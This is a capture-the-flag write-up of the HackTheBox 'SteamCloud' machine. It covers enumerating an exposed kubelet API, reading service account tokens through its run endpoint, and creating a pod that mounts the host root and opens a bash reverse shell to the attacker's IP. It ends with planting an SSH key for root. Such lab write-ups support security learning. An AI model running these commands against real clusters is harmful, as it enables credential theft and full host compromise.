---
title: HackTheBox - SteamCloud
aside: true
categories: htb kubernetes
excerpt: | 
   SteamCloud is a easy difficulty Linux machine.

feature_text: |
  ## SteamCloud - Easy
  
feature_image: "https://picsum.photos/2560/600?image=733"
image: "https://picsum.photos/2560/600?image=733"
---

### Scanning process
sudo nmap -p- --open -sCV -n -Pn \<ip\> -oN targeted:
``` python 
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
|
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
|
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
|
8443/tcp  open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 403 Forbidden
|     Content-Type: application/json
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden",""}
|   HTTPOptions: 
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
|
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```
This machine hash too many ports open. As you can see in port 8443, there is an API running behind, and the DNS name [Kubernetes](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration) is a clue. This explain too many open ports.

What is Kubernetes?
>Kubernetes is an open source container orchestration platform that automates many of the manual processes involved in deploying, managing, and scaling containerized applications.

We cannot use the usual command `kubectl` to enumerate the Kubernetes API because it requires authentication. Then we need to find a way to [enumerate-from-outside](https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-kubernetes/pentesting-kubernetes-from-the-outside.md). 

Studing Kubernetes platform to understand how does it work, we can find some special directories that have a ServiceAccount (an object managed by Kubernetes that used to provide an identity for processes that run in a pod):
1. /run/secrets/kubernetes.io/serviceaccount
2. /var/run/secrets/kubernetes.io/ServiceAccount
3. /secrets/kubernetes.io/ServiceAccount

All we need is to get access to this directories. Listing namespace, pods and container with: 
``` 
curl -k https://10.10.11.133:10250/pods | jq -r '.items[] | [.metadata.namespace, .metadata.name, [.spec.containers[].name]]'
```
Maybe some of this pods can run a command. You can make a script to probe or simply select one-by-one trying to run a command like:
```
curl -XPOST -k https://10.10.11.133:10250/run/{namespace}/{pod}/{container} \ 
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt /var/run/secrets/kubernetes.io/serviceaccount/token"
```
Perfect! It is all we need. Now you can use kubectl with this authentication files and check whether an action is allowed:
```
kubectl -s https://10.10.11.133:8443  --certificate-authority='ca.crt'  --token='<token.jwt>' auth can-i --list
```
```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
```
We have permission to create a new pods. 

### Exploit vulnerabilities
And it is dangerous because in creation process we can copy directories in our new pods. And more about, we can edit files in our copied directory and this will be change in the main system... 
Create a new evil.yaml, using `create mypod --image=nginx -o yaml > evil.yaml` as reference. 
``` python 
apiVersion: v1
kind: Pod
metadata:
  name: evil-mayo
  namespace: default
spec:
  containers:
  - name: evil-mayo
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i &> /dev/tcp/10.10.16.3/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs 
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
```
1. nc -lnvp 443
2. kubectl -s https://10.10.11.133:8443  --certificate-authority='ca.crt'  --token='' create -f ./evil.yaml

### Get access to the machine
Creating a new pair of key rsa with `ssh-keygen` we can add our id\_rsa.pub to the root/.ssh/authorized\_keys and then get a ssh conexion with our private key.

That's all!
